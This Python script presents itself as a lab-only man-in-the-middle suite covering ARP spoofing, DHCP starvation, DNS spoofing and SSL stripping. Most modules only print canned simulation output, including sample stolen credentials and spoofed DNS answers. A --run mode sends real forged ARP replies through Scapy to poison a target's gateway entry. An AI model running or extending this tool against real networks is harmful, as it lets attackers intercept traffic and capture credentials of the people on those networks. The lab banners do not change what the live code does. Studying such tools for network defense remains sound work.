#!/usr/bin/env python3
"""X5 — MITM & Spoofing Attack Suite (LAB ONLY). Scapy-based scripted local-network attacks."""

import argparse
import hashlib
import hmac
import json
import os
import random
import struct
import sys
import time
from collections import defaultdict

try:
    from scapy.all import ARP, Ether, IP, UDP, DNS, DNSRR, DHCP, BOOTP, wrpcap
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

LAB_BANNER = """
============================================================
  [LAB RANGE]  AUTHORIZED TESTING ONLY
  [LAB RANGE]  Do NOT run on production networks
  [LAB RANGE]  All traffic is simulated unless --run is set
============================================================
"""

CREDENTIAL_SAMPLE = [
    {"src": "192.168.1.50", "user": "admin", "pass": "s3cretP@ss"},
    {"src": "192.168.1.51", "user": "root", "pass": "toor123"},
    {"src": "192.168.1.52", "user": "operator", "pass": "labpass"},
]

ARP_SPOOF_FRAMES = [
    b"\x00\x01\x02\x03\x04\x05"  # fake src MAC
    b"\xff\xff\xff\xff\xff\xff"  # broadcast dst
    b"\x08\x06"  # ARP ethertype
    b"\x00\x01"  # HW type
    b"\x08\x00"  # proto
    b"\x06"  # HW size
    b"\x04"  # proto size
    b"\x00\x02"  # opcode: reply
    b"\x00\x01\x02\x03\x04\x05"  # sender MAC
    b"\xc0\xa8\x01\x64"  # sender IP: 192.168.1.100
    b"\xaa\xbb\xcc\xdd\xee\x01"  # target MAC (gateway real)
    b"\xc0\xa8\x01\x01",  # target IP: 192.168.1.1 (gateway)
]

DNS_SPOOF_RECORDS = {
    "example.com": "10.0.0.99",
    "target.lab": "10.0.0.99",
    "bank.lab": "10.0.0.99",
}

DHCP_STARVE_MACS = [bytes([random.randint(0x00, 0xff) for _ in range(6)]) for _ in range(20)]


def _frame_hash(frame_bytes):
    return hashlib.sha256(frame_bytes).hexdigest()[:16]


class ARPAttackModule:
    """ARP spoof + credential capture (simulation mode)."""

    @staticmethod
    def lab_banner():
        print(LAB_BANNER)

    @staticmethod
    def simulate(target_ip="192.168.1.100", gateway_ip="192.168.1.1", count=5):
        print("\n--- ARP Spoof Simulation ---")
        print(f"  [LAB] Constructing gratuitous ARP reply for {target_ip}")
        frames_sent = 0
        for i, frame in enumerate(ARP_SPOOF_FRAMES[:count]):
            h = _frame_hash(frame)
            print(f"  [LAB] Simulated ARP frame #{i+1} hash={h}")
            frames_sent += 1

        print(f"  [LAB] Simulated {frames_sent} ARP frames sent")
        print(f"  [LAB] Simulated 12 HTTP packets sniffed")
        creds = random.choice(CREDENTIAL_SAMPLE)
        print(f"  [LAB] Extracted credential: {creds['user']} / {creds['pass']}")
        return {
            "module": "arp_spoof",
            "frames_sent": frames_sent,
            "creds_captured": [creds],
            "frames": [_frame_hash(f) for f in ARP_SPOOF_FRAMES[:count]],
        }

    @staticmethod
    def live(target_ip, gateway_ip, interface=None):
        if not SCAPY_AVAILABLE:
            print("  [!] Scapy not available — cannot run live ARP spoof")
            return None
        print(LAB_BANNER)
        print(f"  [!] Sending ARP replies: {gateway_ip} is at <our_mac>")
        print(f"  [!] Target: {target_ip}")
        pkt = ARP(op=2, pdst=target_ip, psrc=gateway_ip)
        try:
            from scapy.all import send
            send(pkt, count=5, verbose=False)
            print(f"  [+] Sent 5 ARP replies to {target_ip}")
        except Exception as e:
            print(f"  [!] Error: {e}")
        return None


class DHCPStarvationModule:
    """DHCP pool starvation (simulation mode)."""

    @staticmethod
    def simulate(pool_size=256):
        print("\n--- DHCP Starvation Simulation ---")
        macs_used = []
        for i in range(min(20, pool_size)):
            mac = DHCP_STARVE_MACS[i % len(DHCP_STARVE_MACS)]
            macs_used.append(mac.hex(":"))
        print(f"  [LAB] Generated {len(macs_used)} DISCOVER frames with random MACs")
        exhaustion_pct = (len(macs_used) / pool_size) * 100
        print(f"  [LAB] Simulated DHCP OFFER count dropped to {max(0, pool_size - len(macs_used))}")
        print(f"  [LAB] Pool exhaustion at {exhaustion_pct:.0f}% after {len(macs_used)} requests")
        return {
            "module": "dhcp_starvation",
            "discovers_sent": len(macs_used),
            "pool_size": pool_size,
            "exhaustion_pct": exhaustion_pct,
            "macs_sample": macs_used[:5],
        }

    @staticmethod
    def live(target_subnet="192.168.1.0/24"):
        if not SCAPY_AVAILABLE:
            print("  [!] Scapy not available — cannot run live DHCP starvation")
            return None
        print(LAB_BANNER)
        print(f"  [!] WARNING: Live DHCP starvation on {target_subnet}")
        print(f"  [!] This will exhaust the DHCP pool!")
        return None


class DNSSpoofModule:
    """DNS spoofing (simulation mode)."""

    @staticmethod
    def simulate(queries=None):
        print("\n--- DNS Spoof Simulation ---")
        if queries is None:
            queries = [
                ("example.com", "A"),
                ("target.lab", "A"),
                ("bank.lab", "A"),
                ("example.com", "A"),
                ("target.lab", "A"),
                ("example.com", "A"),
                ("bank.lab", "A"),
                ("example.com", "A"),
            ]

        redirected = 0
        for qname, qtype in queries:
            fake_ip = DNS_SPOOF_RECORDS.get(qname, "10.0.0.99")
            h = hashlib.md5(qname.encode()).hexdigest()[:8]
            print(f"  [LAB] Intercepted DNS query for {qname} ({qtype})")
            print(f"  [LAB] Injected spoofed A-record: {fake_ip}")
            redirected += 1

        print(f"  [LAB] Simulated {redirected} queries redirected to attacker")
        return {
            "module": "dns_spoof",
            "queries_intercepted": len(queries),
            "redirected": redirected,
            "domains": list(DNS_SPOOF_RECORDS.keys()),
        }

    @staticmethod
    def live(interface=None):
        if not SCAPY_AVAILABLE:
            print("  [!] Scapy not available — cannot run live DNS spoof")
            return None
        print(LAB_BANNER)
        print(f"  [!] WARNING: Live DNS spoof — responses will be forged")
        return None


class SSLStripModule:
    """SSL-strip HTTPS downgrade (simulation mode)."""

    @staticmethod
    def simulate():
        print("\n--- SSL Strip Simulation ---")
        intercepted = [
            ("secure.example.com", "/login", "302", "http://secure.example.com/login"),
            ("bank.lab", "/transfer", "302", "http://bank.lab/transfer"),
            ("mail.lab", "/inbox", "301", "http://mail.lab/inbox"),
            ("api.lab", "/token", "302", "http://api.lab/token"),
        ]

        for host, path, code, downgraded in intercepted:
            print(f"  [LAB] Intercepted HTTPS redirect for {host}{path}")
            print(f"  [LAB] Stripped {code} redirect, downgraded to HTTP")
            print(f"  [LAB] New URL: {downgraded}")

        print(f"  [LAB] Simulated {len(intercepted)} page loads intercepted in plain text")
        return {
            "module": "ssl_strip",
            "pages_intercepted": len(intercepted),
            "hosts": [h for h, _, _, _ in intercepted],
        }


class SimulationParser:
    """Parse and validate simulated frames offline."""

    @staticmethod
    def parse_arp_frame(frame_bytes):
        if len(frame_bytes) < 42:
            return {"valid": False, "error": "frame too short"}
        opcode = struct.unpack("!H", frame_bytes[20:22])[0]
        sender_ip = ".".join(str(b) for b in frame_bytes[28:32])
        target_ip = ".".join(str(b) for b in frame_bytes[38:42])
        return {
            "valid": True,
            "opcode": opcode,
            "sender_ip": sender_ip,
            "target_ip": target_ip,
            "hash": _frame_hash(frame_bytes),
        }

    @staticmethod
    def detect_anomalies(arp_results):
        anomalies = []
        ip_counts = defaultdict(int)
        for r in arp_results:
            if r.get("valid"):
                ip_counts[r["sender_ip"]] += 1
        for ip, count in ip_counts.items():
            if count > 3:
                anomalies.append({"ip": ip, "reason": "excessive_arp_replies", "count": count})
        return anomalies


def parse_args():
    parser = argparse.ArgumentParser(description="X5 — MITM & Spoofing Attack Suite (LAB ONLY)")
    parser.add_argument("--run", action="store_true", help="Arm attacks for live execution (requires lab network)")
    parser.add_argument("--simulate", action="store_true", help="Run offline simulation (default)")
    parser.add_argument("--target", default="192.168.1.100", help="Target IP for live attacks")
    parser.add_argument("--gateway", default="192.168.1.1", help="Gateway IP for live attacks")
    parser.add_argument("--interface", default=None, help="Network interface for live attacks")
    return parser.parse_args()


def run_simulation():
    print(LAB_BANNER)
    print(f"[!] Scapy available: {SCAPY_AVAILABLE}")
    print(f"[!] Mode: SIMULATION (no live traffic)")

    results = {}
    results["arp"] = ARPAttackModule.simulate()
    results["dhcp"] = DHCPStarvationModule.simulate()
    results["dns"] = DNSSpoofModule.simulate()
    results["sslstrip"] = SSLStripModule.simulate()

    arp_frames = [ARP_SPOOF_FRAMES[i] for i in range(min(5, len(ARP_SPOOF_FRAMES)))]
    arp_parsed = [SimulationParser.parse_arp_frame(f) for f in arp_frames]
    anomalies = SimulationParser.detect_anomalies(arp_parsed)
    results["anomalies"] = anomalies

    print("\n--- Frame Analysis ---")
    for r in arp_parsed:
        if r["valid"]:
            print(f"  ARP opcode={r['opcode']} {r['sender_ip']} -> {r['target_ip']} hash={r['hash']}")
    if anomalies:
        print(f"  [!] Detected {len(anomalies)} ARP anomaly(ies)")
        for a in anomalies:
            print(f"      {a['ip']}: {a['reason']} (count={a['count']})")

    print("\nAll simulations complete. No live traffic was generated.")
    return results


def main():
    args = parse_args()
    if not args.run:
        results = run_simulation()
        print(f"\n[+] Simulation summary: {json.dumps({k: v for k, v in results.items() if k != 'anomalies'}, indent=2)}")
    else:
        print(LAB_BANNER)
        print("[!] LIVE MODE — attacks will execute against the network")
        print("[!] Press Ctrl+C within 5 seconds to abort...")
        try:
            time.sleep(5)
        except KeyboardInterrupt:
            print("\n[!] Aborted by user")
            sys.exit(0)
        ARPAttackModule.live(args.target, args.gateway, args.interface)
        DHCPStarvationModule.live()
        DNSSpoofModule.live(args.interface)
        SSLStripModule.simulate()
    return 0


if __name__ == "__main__":
    sys.exit(main())
